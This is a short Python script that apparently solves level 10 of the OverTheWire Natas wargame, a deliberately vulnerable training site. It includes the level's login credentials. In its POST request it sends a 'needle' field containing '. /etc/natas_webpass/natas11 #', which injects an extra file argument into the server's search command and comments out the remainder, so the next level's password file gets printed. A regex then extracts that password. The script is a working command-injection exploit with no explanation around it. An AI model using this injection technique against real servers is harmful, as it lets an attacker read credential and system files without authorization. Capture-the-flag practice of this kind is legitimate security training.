import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = f"http://{username}.natas.labs.overthewire.org/"

response = requests.post(url, data = {"submit": "submit", "needle": ". /etc/natas_webpass/natas11 #"}, auth = (username, password) )

#print(response.text)

print(re.findall('<pre>\n(.*)\n</pre>', response.text)[0])
